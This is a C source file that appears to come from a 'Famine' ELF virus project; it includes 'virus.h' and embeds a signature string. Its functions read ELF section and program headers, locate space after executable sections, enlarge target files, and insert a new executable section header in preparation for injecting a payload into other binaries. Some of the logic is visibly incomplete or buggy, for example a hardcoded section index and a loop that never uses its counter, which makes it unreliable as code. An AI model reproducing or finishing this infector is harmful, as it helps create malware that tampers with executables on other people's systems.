#include "virus.h"

struct indexAndOffset {
    int last_pHdr_exec;
    int last_sHdr_exec;
    unsigned long int offset;
};

void ft_print_hexa_raw(unsigned char *buf, size_t len) {
    size_t i = 0;
    while (i < len) {
        if (i % 40 == 0)
            printf("\n");
        printf("%.2hhx ", buf[i]);
        i++;
    }
    printf("\n");
}


void    findLastExecSectionAndSegment(struct sheaders64 *sHdrs, struct pheaders64 *pHdrs, struct ELFheaders64 fHdr, int *last_pHdr_exec, int *last_sHdr_exec) {
    int i = 0;

    while (i < fHdr.e_phnum) {
        if (pHdrs[i].p_flags & PF_X)
            *last_pHdr_exec = i;
        i++;
    }
    i = 0;
    while (i < fHdr.e_shnum) {
        if (sHdrs[i].sh_flags & SHF_EXECINSTR)
            *last_sHdr_exec = i;
        i++;
    }
}

struct indexAndOffset set_resultats(int last_phdr, int last_shdr, unsigned long int offset) {
    struct indexAndOffset res;

    res.last_pHdr_exec = last_phdr;
    res.last_sHdr_exec = last_shdr;
    res.offset = offset;
    return (res);
}

struct indexAndOffset find_injection_position(int fd, struct ELFheaders64 fHdr, struct pheaders64 *pHdrs, struct sheaders64 *sHdrs) {
    struct indexAndOffset resultats;
    int bytes_rd;

    if(ft_syscall(LSEEK, (void *)fd, (void *)fHdr.e_shoff, 0, 0) == -1)
        return (set_resultats(0, 0, 0));
    bytes_rd = (int)ft_syscall(READ, (void *)fd, (void *)sHdrs, (void *)(fHdr.e_shnum * fHdr.e_shentsize), 0);
    if (bytes_rd < fHdr.e_shnum * fHdr.e_shentsize)
        return (set_resultats(0, 0, 0));
    
    if(ft_syscall(LSEEK, (void *)fd, (void *)fHdr.e_phoff, 0, 0) == -1)
        return (set_resultats(0, 0, 0));
    bytes_rd = (int)ft_syscall(READ, (void *)fd, (void *)pHdrs, (void *)(fHdr.e_phnum * fHdr.e_phentsize), 0);
    if (bytes_rd < fHdr.e_phnum * fHdr.e_phentsize)
        return (set_resultats(0, 0, 0));
    
    findLastExecSectionAndSegment(sHdrs, pHdrs, fHdr, &(resultats.last_pHdr_exec), &(resultats.last_sHdr_exec));
    if (resultats.last_pHdr_exec == -1 || resultats.last_sHdr_exec == -1)
        return (set_resultats(0, 0, 0));
    if ((pHdrs[resultats.last_pHdr_exec].p_offset - (sHdrs[resultats.last_sHdr_exec].sh_offset + sHdrs[resultats.last_sHdr_exec].sh_size)) < 0xd00)
        return (set_resultats(0, 0, 0));
    else
        return (set_resultats(resultats.last_pHdr_exec, resultats.last_sHdr_exec, \
        sHdrs[resultats.last_sHdr_exec].sh_offset + sHdrs[resultats.last_sHdr_exec].sh_size));
}

void change_file_header(int fd, struct ELFheaders64 fHdr, unsigned long int offset_injection, struct sheaders64 *sHdrs) {
    unsigned char tmp[fHdr.e_shentsize * (fHdr.e_shnum + 1)];
    struct sheaders64 new_header;

    new_header.sh_addr = 0x0;
    new_header.sh_addralign = 0x1;
    new_header.sh_entsize = 0;
    new_header.sh_flags = 0x1 | 0x4;
    new_header.sh_info = 0x0;
    new_header.sh_link = 0x0;
    new_header.sh_name = 0x0;
    new_header.sh_offset = sHdrs[27].sh_offset + sHdrs[27].sh_size + 0x1;
    new_header.sh_size = 0x2000;
    new_header.sh_type = 0x1;

    unsigned long int sum = sHdrs[27].sh_offset;
    printf("size = %lx\n", sHdrs[27].sh_size);
    for (int i = 27; i < fHdr.e_shnum; i++) {
        sum += sHdrs[27].sh_size;
        sHdrs[27 + 1].sh_offset = new_header.sh_offset + new_header.sh_size;

    }
    // ft_syscall(LSEEK, (void *)fd, (void *)fHdr.e_shoff, 0, 0);
    // ft_syscall(READ, (void *)fd, (void *)tmp, (void *)(fHdr.e_shnum * (fHdr.e_shentsize)), 0);
    memncat(tmp, 0, sHdrs, fHdr.e_shnum * fHdr.e_shentsize);
    memncat(tmp, fHdr.e_shnum * (fHdr.e_shentsize), &new_header, sizeof(new_header));

    fHdr.e_shnum = fHdr.e_shnum + 1;
    ft_syscall(LSEEK, (void *)fd, (void *)0x3c, 0, 0);
    ft_syscall(WRITE, (void *)fd, (void *)&fHdr.e_shnum, (void *)8, 0);
    ft_syscall(LSEEK, (void *)fd, (void *)fHdr.e_shoff, 0, 0);
    ft_syscall(WRITE, (void *)fd, (void *)tmp, (void *)(fHdr.e_shnum * fHdr.e_shentsize), 0);
}

void change_program(int fd, struct ELFheaders64 fHdr, struct pheaders64 *pHdrs) {
    pHdrs[fHdr.e_phnum - 1].p_memsz = pHdrs[fHdr.e_phnum - 1].p_memsz + 0x2000;
    pHdrs[fHdr.e_phnum - 1].p_flags = pHdrs[fHdr.e_phnum - 1].p_flags | 0x01;
    ft_syscall(LSEEK, (void *)fd, (void *)fHdr.e_phoff + fHdr.e_phentsize * fHdr.e_phnum + 0x28, 0, 0);
    ft_syscall(WRITE, (void *)fd, (void *)&(pHdrs[fHdr.e_phnum - 1].p_memsz), (void *)8, 0);
    ft_syscall(LSEEK, (void *)fd, (void *)fHdr.e_phoff + fHdr.e_phentsize * fHdr.e_phnum + 0x04, 0, 0);
    ft_syscall(WRITE, (void *)fd, (void *)&(pHdrs[fHdr.e_phnum - 1].p_flags), (void *)4, 0);
}

unsigned char increaseFileSize(int fd) {
    struct stat buf;
    
    if ((int)ft_syscall(FSTAT, (void *)fd, (void *)&buf, 0, 0) < 0)
        return (1);
    if((int)ft_syscall(FTRUNCATE, (void *)fd, (void *)(buf.st_size + 0x2000), 0, 0) < 0)
        return (1);
    return (0);
}

unsigned long int    writeFile(int fd, struct ELFheaders64 fHdr) {
    unsigned long int offset_injection;
    const char signature[] = "Famine version 1.0 (c)oded by <pgoudet>-<Mastermind pgoudet>";
    struct sheaders64 sHdrs[fHdr.e_shnum + 1];
    struct pheaders64 pHdrs[fHdr.e_phnum];
    int res, bytes_rd;

    if(ft_syscall(LSEEK, (void *)fd, (void *)fHdr.e_shoff, 0, 0) == -1)
        return (0);
    bytes_rd = (int)ft_syscall(READ, (void *)fd, (void *)&sHdrs, (void *)(fHdr.e_shnum * fHdr.e_shentsize), 0);
    if (bytes_rd < fHdr.e_shnum * fHdr.e_shentsize)
        return (0);

    if (increaseFileSize(fd) == 1)
        return (0);
    offset_injection = fHdr.e_shoff + fHdr.e_shentsize * fHdr.e_shnum + sHdrs[fHdr.e_shnum - 1].sh_size + 0x1;
    change_file_header(fd, fHdr, offset_injection, sHdrs);
    // change_program(fd, fHdr, pHdrs);
    return (offset_injection);

}